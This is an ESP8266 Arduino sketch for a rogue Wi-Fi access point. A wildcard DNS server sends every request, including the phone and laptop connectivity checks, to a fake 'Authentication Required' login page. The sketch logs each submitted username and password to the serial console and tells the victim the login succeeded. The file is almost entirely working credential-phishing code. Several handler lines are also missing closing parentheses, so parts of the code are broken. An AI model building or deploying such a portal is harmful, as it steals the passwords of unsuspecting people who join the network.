#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

bool loginProcessed = false;
String lastUsername = "";
unsigned long startTime;

// New Styled Login Page
String responseHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authentication Required</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      background-color: #f9fafb;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1rem;
    }
    .login-container {
      width: 100%;
      max-width: 400px;
      border: 1px solid #ef4444;
      border-radius: 4px;
      overflow: hidden;
    }
    .form-section {
      background-color: #e5e7eb;
      padding: 1rem;
    }
    .form-title {
      text-align: center;
      font-weight: 500;
      margin-bottom: 1rem;
      color: #000;
    }
    .form-content {
      background-color: #d1d5db;
      padding: 1rem;
      font-size: 0.875rem;
      color: #000;
    }
    .form-content p {
      margin-bottom: 1rem;
    }
    .form-group {
      display: flex;
      align-items: center;
      margin-bottom: 0.75rem;
    }
    .form-group label {
      width: 6rem;
      color: #000;
    }
    .form-group input {
      flex: 1;
      border: 1px solid #9ca3af;
      padding: 0.25rem 0.5rem;
      color: #000;
    }
    .form-actions {
      display: flex;
      justify-content: flex-end;
    }
    .btn-continue {
      background-color: #e5e7eb;
      border: 1px solid #9ca3af;
      padding: 0.25rem 1rem;
      color: #000;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="form-section">
      <h2 class="form-title">Authentication Required</h2>
      <div class="form-content">
        <p>Please enter your username and password to continue.</p>
        <form id="loginForm" action="/login" method="POST">
          <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
          </div>
          <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
          </div>
          <div class="form-actions">
            <button class="btn-continue" type="submit">Continue</button>
          </div>
        </form>
      </div>
    </div>
  </div>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    startTime = millis();
    webServer.on("/hotspot-detect.html", []() {
  webServer.send(200, "text/html", responseHTML);
};

webServer.on("/library/test/success.html", []() {
  webServer.send(200, "text/html", responseHTML);
};

webServer.onNotFound([]() {
  webServer.send(200, "text/html", responseHTML);
};

    Serial.println(F("\n=============================="));
    Serial.println(F("   USERS AND PASSWORDS   "));
    Serial.println(F("=============================="));

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("BUE");

    Serial.print(F("Access Point Started: "));
    Serial.println(WiFi.softAPIP());

    dnsServer.start(DNS_PORT, "*", apIP);
    webServer.on("/", []() { webServer.send(200, "text/html", responseHTML); });

    webServer.on("/generate_204", []() { 
        webServer.sendHeader("Location", "http://" + WiFi.softAPIP().toString(), true);
        webServer.send(302, "text/plain", "");
    };

    webServer.on("/login", HTTP_POST, []() {
        String username = webServer.arg("username");
        String password = webServer.arg("password");

        Serial.println(F("\n--------------------------------"));
        Serial.print(F("Time Elapsed: ")); 
        Serial.print((millis() - startTime) / 1000);
        Serial.println(F(" sec"));

        if (!loginProcessed || username != lastUsername) {
            lastUsername = username;
            loginProcessed = true;

            Serial.println(F("[NEW LOGIN ATTEMPT]"));
            Serial.print(F("Username: ")); Serial.println(username);
            Serial.print(F("Password: ")); Serial.println(password);
        } else {
            Serial.println(F("[DUPLICATE LOGIN IGNORED]"));
        }
        Serial.println(F("--------------------------------\n"));

        webServer.send(200, "text/html", R"rawliteral(
            <html>
            <head>
                <meta http-equiv="refresh" content="2;url=/success">
                <script>
                    setTimeout(function() { window.location.href = "/success"; }, 2000);
                </script>
            </head>
            <body>
                <h1>Login Successful</h1>
                <p>Redirecting...</p>
            </body>
            </html>
        )rawliteral");
    });

    webServer.on("/success", []() {
        webServer.send(200, "text/html", "<h1>Login Successful</h1><p>Thank you!</p>");
    });

    webServer.begin();
    Serial.println(F("Web Server Started"));
}

void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}